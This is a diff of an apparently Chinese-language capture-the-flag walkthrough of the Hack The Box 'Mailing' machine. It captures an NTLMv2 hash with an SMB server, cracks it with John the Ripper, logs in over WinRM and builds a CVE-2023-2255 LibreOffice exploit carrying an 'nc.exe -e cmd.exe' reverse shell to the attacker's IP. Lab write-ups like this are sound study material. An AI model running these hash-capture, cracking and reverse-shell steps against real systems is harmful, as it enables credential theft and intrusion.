@@ -412,28 +412,8 @@ Alexander Hagenah / @xaitax / ah@primepage.de
 
 
 [★]$ sudo su
-#git clone https://github.com/lgandx/Responder.git
-Cloning into 'Responder'...
-remote: Enumerating objects: 2757, done.
-remote: Counting objects: 100% (917/917), done.
-remote: Compressing objects: 100% (364/364), done.
-remote: Total 2757 (delta 694), reused 553 (delta 553), pack-reused 1840 (from 5)
-Receiving objects: 100% (2757/2757), 2.76 MiB | 21.28 MiB/s, done.
-
-#cd Responder
-[/home/syareya55/Responder]#ls
-certs         LICENSE          poisoners         Responder.conf  utils.py
-CHANGELOG.md  logs             pyproject.toml    Responder.py
-Contributors  odict.py         README.md         servers
-DumpHash.py   OSX_launcher.sh  Report.py         settings.py
-files         packets.py       requirements.txt  tools
-
-[/home/syareya55/Responder]#python3 -m pip --version
+#git clone https://github.com/lgandx/Responder.git     //这个是python3，无法成功的原因是80端口占用
 [/home/syareya55/Responder]#sudo pip3 install aioquic
-```
-#### 运行
-```
-
 [★]$ cd Responder 
 [~/Responder][★]$ sudo ./Responder.py -I tun0
                                          __
@@ -441,75 +421,180 @@ files         packets.py       requirements.txt  tools
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|
-
-
-[*] Tips jar:
-    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
-    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
-
-[+] Poisoners:
-    LLMNR                      [ON]
-    NBT-NS                     [ON]
-    MDNS                       [ON]
-    DNS                        [ON]
-    DHCP                       [OFF]
-    DHCPv6                     [OFF]
-
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    MQTT server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]
-    SNMP server                [ON]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Force ESS downgrade        [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [10.10.14.93]
-    Responder IPv6             [fe80::1019:d048:70ed:d8a6]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
-    Don't Respond To MDNS TLD  ['_DOSVC']
-    TTL for poisoned response  [default]
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-T0903FQJW6N]
-    Responder Domain Name      [URCQ.LOCAL]
-    Responder DCE-RPC Port     [47028]
-
-[*] Version: Responder 3.2.1.0
-[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
-
-[+] Listening for events...
-
-[!] Error starting TCP server on port 80, check permissions or other servers running.
-
-
-
-
 ```
+#### 看了官方文档，直接使用下面的命令代替Responder,先开执行下面命令，再重新发送邮件，就可以有反弹
+```
+[★]$ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+01/27/2026 02:16:30 AM: INFO: Config file parsed
+01/27/2026 02:17:36 AM: INFO: Incoming connection (10.129.232.39,58615)
+01/27/2026 02:17:36 AM: INFO: AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+01/27/2026 02:17:36 AM: INFO: User MAILING\maya authenticated successfully
+01/27/2026 02:17:36 AM: INFO: maya::MAILING:aaaaaaaaaaaaaaaa:b1acbf6a69074ca7844cd1bdc2a0245f:01010000000000000090ce64658fdc01023432e3451526f20000000001001000690053004600650071007300520049000300100069005300460065007100730052004900020010007a00540046004c005900690068004200040010007a00540046004c005900690068004200070008000090ce64658fdc01060004000200000008003000300000000000000000000000002000007e4e3ef4fb87d988bc42a1d14826e32805bd35cfd0a6653af88d4bb3bb3a901a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390033000000000000000000
+01/27/2026 02:17:36 AM: INFO: Connecting Share(1:IPC$)
+```
+#### 让我们将为用户maya捕获的NTLM哈希保存到一个文件中
+```
+[★]$ echo 'maya::MAILING:aaaaaaaaaaaaaaaa:b1acbf6a69074ca7844cd1bdc2a0245f:01010000000000000090ce64658fdc01023432e3451526f20000000001001000690053004600650071007300520049000300100069005300460065007100730052004900020010007a00540046004c005900690068004200040010007a00540046004c005900690068004200070008000090ce64658fdc01060004000200000008003000300000000000000000000000002000007e4e3ef4fb87d988bc42a1d14826e32805bd35cfd0a6653af88d4bb3bb3a901a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390033000000000000000000' > hash.txt
+```
+#### 我们尝试使用 开膛手约翰 John The Ripper 来破解这个密码散列 
+```
+[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[★]$ gunzip rockyou.txt.gz
+[★]$ john -w=rockyou.txt hash.txt
+Created directory: /home/syareya55/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:02 DONE (2026-01-27 02:27) 0.4608g/s 2734Kp/s 2734Kc/s 2734KC/s m61405..m4895621
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+#### m4y4ngs4ri 使用获得的密码m4y4ngs4ri通过WinRM作为用户maya登录
+```
+[★]$ evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents> whoami
+mailing\maya
+*Evil-WinRM* PS C:\Users\maya\Documents> cat ../Desktop/user.txt
+```
+### Privilege Escalation
+#### 在列举文件系统时，我们发现系统上安装了LibreOffice。它的版本信息可以在C:\Program Files\ LibreOffice\program\version.ini文件中找到
+```
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/22/2025   4:36 PM                cleanup
+d-----         4/10/2024   5:32 PM                Important Documents
+d-----         2/28/2024   8:49 PM                inetpub
+d-----         12/7/2019  10:14 AM                PerfLogs
+d-----          3/9/2024   1:47 PM                PHP
+d-r---         3/13/2024   4:49 PM                Program Files
+d-r---         3/14/2024   3:24 PM                Program Files (x86)
+d-r---          3/3/2024   4:19 PM                Users
+d-----         4/29/2024   6:58 PM                Windows
+d-----         4/12/2024   5:54 AM                wwwroot
+
+*Evil-WinRM* PS C:\Program Files> dir
+
+
+    Directory: C:\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/27/2024   5:30 PM                Common Files
+d-----          3/3/2024   4:40 PM                dotnet
+d-----          3/3/2024   4:32 PM                Git
+d-----         4/29/2024   6:54 PM                Internet Explorer
+d-----          3/4/2024   6:57 PM                LibreOffice
+d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
+d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
+d-----         2/27/2024   4:58 PM                MSBuild
+d-----         2/27/2024   5:30 PM                OpenSSL-Win64
+d-----         3/13/2024   4:49 PM                PackageManagement
+d-----         2/27/2024   4:58 PM                Reference Assemblies
+d-----         3/13/2024   4:48 PM                RUXIM
+d-----         2/27/2024   4:32 PM                VMware
+d-----          3/3/2024   5:13 PM                Windows Defender
+d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
+d-----          3/3/2024   5:13 PM                Windows Mail
+d-----          3/3/2024   5:13 PM                Windows Media Player
+d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
+d-----         2/27/2024   4:26 PM                Windows NT
+d-----          3/3/2024   5:13 PM                Windows Photo Viewer
+d-----         4/29/2024   6:54 PM                Windows Portable Devices
+d-----         12/7/2019  10:31 AM                Windows Security
+d-----         3/13/2024   4:49 PM                WindowsPowerShell
+
+
+*Evil-WinRM* PS C:\Program Files\libreoffice\program> type version.ini
+[Version]
+AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
+buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
+ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
+MsiProductVersion=7.4.0.1
+```
+#### 有了LibreOffice的版本信息，我们可以搜索任何相关的漏洞并发现这个版本容易受到CVE-2023-2255的攻击。此漏洞涉及不正确的访问控件，允许攻击者创建一个加载的文档外部链接不提示用户。我们可以假设一个系统用户正在打开文件LibreOffice。为了利用这一点，我们可以上传一个恶意文件到系统，然后等待用户打开它，触发我们的载荷。生成恶意负载的PoC可以在这里找到。让我们将这个GitHub存储库克隆到本地系统
+```
+//得把它安装在CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability目录下，方便上传payload
+[★]$ git clone https://github.com/elweth-sec/CVE-2023-2255.git
+[★]$ cd CVE-2023-2255
+[~/CVE-2023-2255][★]$ ls
+CVE-2023-2255.py  README.md  samples  webshell.php
+[★]$ python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e  cmd.exe 10.10.14.93 1337" --output exploit.odt
+File exploit.odt has been created !
+[★]$ cp CVE-2023-2255/exploit.odt .  //复制到当前目录下
+```
+#### 标题：  CVE-2023-2255 通过 IFrame 加载远程文档时未发出提示
+https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/
+#### 按照PoC说明，我们运行Python脚本来生成一个恶意的.odt有效负载有一个反向壳层。
+#### 由于我们的反向shell负载依赖于netcat可执行文件，因此我们必须上传可执行文件到远端主机。
+```
+*Evil-WinRM* PS C:\> dir 
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/22/2025   4:36 PM                cleanup
+d-----         4/10/2024   5:32 PM                Important Documents
+d-----         2/28/2024   8:49 PM                inetpub
+d-----         12/7/2019  10:14 AM                PerfLogs
+d-----          3/9/2024   1:47 PM                PHP
+d-r---         3/13/2024   4:49 PM                Program Files
+d-r---         3/14/2024   3:24 PM                Program Files (x86)
+d-r---          3/3/2024   4:19 PM                Users
+d-----         4/29/2024   6:58 PM                Windows
+d-----         4/12/2024   5:54 AM                wwwroot
+
+
+//可以看到此时是没有programdata文件显示的，但事实是programdata是自带的
+*Evil-WinRM* PS C:\> cd programdata
+*Evil-WinRM* PS C:\programdata> dir
+
+
+    Directory: C:\programdata
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-         2/28/2024   8:49 PM                Microsoft
+d-----         2/27/2024   4:32 PM                Microsoft OneDrive
+d-----         2/27/2024   8:06 PM                Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38
+d-----          3/3/2024   5:26 PM                Oracle
+d-----          3/3/2024   4:39 PM                Package Cache
+d-----          3/3/2024   4:16 PM                Packages
+d-----          3/1/2024   5:55 PM                PLUG
+d-----         1/27/2026   9:08 AM                regid.1991-06.com.microsoft
+d-----         12/7/2019  10:14 AM                SoftwareDistribution
+d-----          9/8/2022   5:14 AM                ssh
+d-----         2/27/2024   4:25 PM                USOPrivate
+d-----         12/7/2019  10:14 AM                USOShared
+d-----         2/27/2024   4:32 PM                VMware
+d-----         12/7/2019   3:58 PM                WindowsHolographicDevices
+
+
+*Evil-WinRM* PS C:\programdata> 
